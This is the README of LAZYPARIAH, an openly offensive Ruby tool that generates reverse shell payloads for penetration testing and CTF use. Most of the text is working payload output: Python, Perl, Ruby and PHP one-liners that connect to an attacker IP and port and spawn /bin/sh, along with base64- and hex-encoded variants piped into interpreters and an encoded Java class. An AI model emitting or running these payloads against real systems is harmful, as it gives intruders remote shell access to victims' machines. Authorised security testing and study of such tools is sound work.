# LAZYPARIAH
A low-dependency command-line tool for generating reverse shell payloads on the fly.

![Alt text](./lazypariah.svg)

## Description
LAZYPARIAH is a simple and easily installable command-line tool written in pure Ruby that can be used during penetration tests and capture-the-flag (CTF) competitions to generate a range of reverse shell payloads on the fly.

The reverse shell payloads that LAZYPARIAH supports include (but are not limited to):

* C binary payloads (compiled on the fly): `c_binary`, `c_binary_b64`, `c_binary_gzip`, `c_binary_gzip_b64`, `c_binary_hex`, `c_binary_gzip_hex`
* Ruby payloads: `ruby`, `ruby_b64`, `ruby_hex`, `ruby_c`
* Base64-encoded Python payloads: `python_b64`
* Rust binary payloads (compiled on the fly): `rust_binary`, `rust_binary_b64`, `rust_binary_gzip`, `rust_binary_gzip_b64`, `rust_binary_gzip_hex`, `rust_binary_hex`
* PHP scripts containing base64-encoded Python payloads called via the `system()` function: `php_system_python_b64`
* Java classes (compiled on the fly): `java_class_binary`, `java_class_b64`, `java_class_gzip_b64`
* Simple PHP payloads (targeting specific file descriptors): `php_fd`, `php_fd_c`, `php_fd_tags`

## Warning
This tool is intended to be used only in authorised circumstances by qualified penetration testers, security researchers and red team professionals. Before downloading, installing or using this tool, ensure that you understand the relevant laws in your jurisdiction. The author of this tool does not endorse, encourage or condone the use of this tool for illegal or unauthorised purposes.

## Dependencies
* Ruby >= 2.7.1 (LAZYPARIAH has not been tested on previous versions of Ruby)
* OpenJDK (Optional: Only required for `java_class` payloads.)
* GCC (Optional: Only required for `c_binary` payloads.)
* Rust (Optional: Only required for `rust_binary` payloads.)

## Installation
LAZYPARIAH can be installed on most Linux systems using the RubyGems installer as follows:
```
gem install lazypariah
```

## Usage
```
Usage:  lazypariah [OPTIONS] <PAYLOAD TYPE> <ATTACKER HOST> <ATTACKER PORT>
Note:   <ATTACKER HOST> may be an IPv4 address, IPv6 address or hostname.

Example:        lazypariah -u python3_b64 10.10.14.4 1555
Example:        lazypariah python2_c malicious.local 1337

Valid Payloads:
    awk
    bash_tcp
    c_binary
    c_binary_b64
    c_binary_gzip
    c_binary_gzip_b64
    c_binary_gzip_hex
    c_binary_hex
    java_class_b64
    java_class_binary
    java_class_gzip_b64
    nc
    nc_pipe
    perl
    perl_b64
    perl_c
    perl_hex
    php_fd
    php_fd_c
    php_fd_tags
    php_system_python_b64
    php_system_python_hex
    python
    python_b64
    python_c
    python_hex
    ruby
    ruby_b64
    ruby_c
    ruby_hex
    rust_binary
    rust_binary_b64
    rust_binary_gzip
    rust_binary_gzip_b64
    rust_binary_gzip_hex
    rust_binary_hex
    socat

Valid Options:
    -h, --help                       Display help text and exit.
    -l, --license                    Display license information and exit.
    -u, --url                        URL-encode the payload.
    -v, --version                    Display version information and exit.
    -D, --fd INTEGER                 Specify the file descriptor used by the target for TCP. Required for certain payloads.
    -P, --pv INTEGER                 Specify Python version for payload. Must be either 2 or 3. By default, no version is specified.
    -N, --no-new-line                Do not append a new-line character to the end of the payload.
```

## Further Notes and Examples
The payloads listed above are more-or-less systematically named.

Payloads ending with `_c` are intended to be executed from within a shell session. These payloads execute code directly using the relevant interpreter (e.g. `python3 -c` or `ruby -e`).

For example, the command `lazypariah python_c 10.10.14.4 1337` should produce the following output:
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.4",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

The command `lazypariah python 10.10.14.4 1337`, on the other hand, should simply produce a block of Python code which could potentially be placed in a `.py` file:
```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.4",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

Generally speaking, selecting payloads ending with `_b64` should produce a command intended to be run from within a shell session in a similar manner to payloads ending with `_c`, but the commands will be different in structure. These commands will essentially pipe a base64-encoded block of code through to `base64 -d` and then on through to the relevant interpreter (such as `python3`, `python2` or `ruby`).

For example, the command `lazypariah python_b64 10.10.14.4 1337` should produce the following output:
```
echo aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjQiLDEzMzcpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOw== | base64 -d | python
```

These types of payloads can be useful in certain situations because they do not include any single or double quotes.

In a similar manner, selecting payloads ending with `_hex` will produce a command that pipes a hexadecimal-encoded block of code through to `xxd -p -r -` and then on through to the relevant interpreter. For example, `lazypariah perl_hex 10.10.14.4 1337` should produce the following output:
```
echo 75736520536f636b65743b24693d2231302e31302e31342e34223b24703d313333373b736f636b657428532c50465f494e45542c534f434b5f53545245414d2c67657470726f746f62796e616d6528227463702229293b696628636f6e6e65637428532c736f636b616464725f696e2824702c696e65745f61746f6e282469292929297b6f70656e28535444494e2c223e265322293b6f70656e285354444f55542c223e265322293b6f70656e285354444552522c223e265322293b6578656328222f62696e2f7368202d6922293b7d3b | xxd -p -r - | perl
```

The exception to this is compiled payloads, such as `c_binary_b64`, `java_class_gzip_b64` and `rust_binary_hex`. Since C, Java and Rust are not interpreted languages, selecting these payloads will simply output the base64-encoded or hexadecimal-encoded data (depending on the payload). If one selects e.g. `java_class_gzip_b64`, the resulting payload should be a base64-encoded gzip-compressed Java class file containing a reverse shell payload. Such payloads may be useful for exploiting insecure deserialisation in a Java web application. For example, the command `lazypariah java_class_gzip_b64 10.10.14.4 1337` should produce the following payload:
```
H4sIAGBTu18AA3VTXVcSURTdgzNcoFEUMaU0M7XwC7QsE8xK08LwoyANzVoD3HQUGdfMUPZXfKi1fPG1XrCVq35AP6bVL8jOBUnJGu5sztl3n3vOmTnz/deXbwBG8MqDNvQw9DL0udDvgQMDAkICwgyDLgx54MJ1DzpxQ8CwcEvWTWGV4JYHXRgRcNuDbowKiCgoXxQaxZgIuMMwLv7viph7DPcZJiQ4x/S8bo9LqAn2LEqQJ40sl+CN63k+V9hKczOppXPE1CZsLbM5q22XfIZJhgcMUxI8UzsZvm3rRt4iJ2EUzAyf1kUIM63QhvZGU3EJ7RJahB3Oafm18IJpZLhlTRT0XJabEupPthK2qefXKDic1vNha10ET6t4iEcqYpih0kraPLfDCSOzyW1KOjQYEms4NCzUj1XEMatiTsA8FlQ8wVMVCSRVPBOwiCUVz9HOkFKxjBUVL5CU0HhSxJ+WVKyiXcVLUb/DtKoqnU9v8AylbzjTV+Us3QjH8tsFm3ri2pYEf4WdL9in6PPBlfjfDyAqXkajybO6SUmmTNMwK/K24HJP/H/PMipBsWzNpLqagv+QRUW6s9liIl3dGrer6m2unFDdSLQsrSrKS0R1Vy2ngk/vULRLtyZzhsWzpalbluAmnZ4rDxoxMZpDktK28tbUbSLlYKlC5XWuYK1XvYXk+rHSynG+LZQzQunmO7q9qOUKYg6z3LJN4x2JMiItOtBK3524JPrRcNLXdlk4cMJN7MfeA0iHcKTkr6hJ1fjkxAEUuQhnESx+CFfK525QRg/gme0r4twcgRqR+4uojShk10WcZHsjjLB+F6sDRTS8hzfAyPAV0bh/9DMgl7j6ABNWmfwRUI5Jp7AqJCvCH6DEfj+aPqOZzm9Z2ocr4to/2iPnAiW5+IlK38UH7CFAnXRA9CGVurtC2At2hGm4GFoZOpkwuiqrmxapfX7/EkNAxlXSyxQXoPsa2Q4EfwOw0NwVrQQAAA==
```

Some payloads require the user to specify the file descriptor used by the target for TCP connections. One example of such a payload is `php_fd_tags`, which is a simple PHP payload enclosed within PHP tags (`<?php` and `?>`) that targets a specific file descriptor.

To specify a target file descriptor, the user must use the command line argument `-D INTEGER` or `--fd INTEGER`. For example, to generate a `php_fd_tags` payload that targets file descriptor `5`, the following command can be used:
`lazypariah -D 5 php_fd_tags 10.10.14.4 1337`

The resulting payload should be as follows:
`<?php $sock=fsockopen("10.10.14.4",1337);exec("/bin/sh -i <&5 >&5 2>&5");?>`

Below are some examples of commands and their respective outputs.

Output of command `lazypariah -P 3 -u python_b64 10.10.14.4 1337`:
```
echo%20aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjQiLDEzMzcpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOw%3D%3D%20%7C%20base64%20-d%20%7C%20python3
```
Output of command `lazypariah -P 2 python_c 10.10.14.4 1337`:
```
python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.4",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
Output of command `lazypariah -D 3 php_fd_tags 10.10.14.4 1337`:
```
<?php $sock=fsockopen("10.10.14.4",1337);exec("/bin/sh -i <&3 >&3 2>&3");?>
```
Output of command `lazypariah ruby 10.10.14.4 1337`:
```
require "socket";exit if fork;c=TCPSocket.new("10.10.14.4","1337");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end
```
Below is a screenshot showing the `c_binary_gzip_b64` payload in action:
![Alt text](./c_binary_gzip_b64_demo.png)

## Author
Copyright (C) 2020 Peter Bruce Funnell

## License
This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.  If not, see <https://www.gnu.org/licenses/>

## Support
If you found this project useful and would like to encourage me to continue making open source software, please consider making a donation via the following link:

https://www.buymeacoffee.com/peterfunnell

Donations in Bitcoin (BTC) are also very welcome. My BTC wallet address is as follows:

```
3EdoXV1w8H7y7M9ZdpjRC7GPnX4aouy18g
```
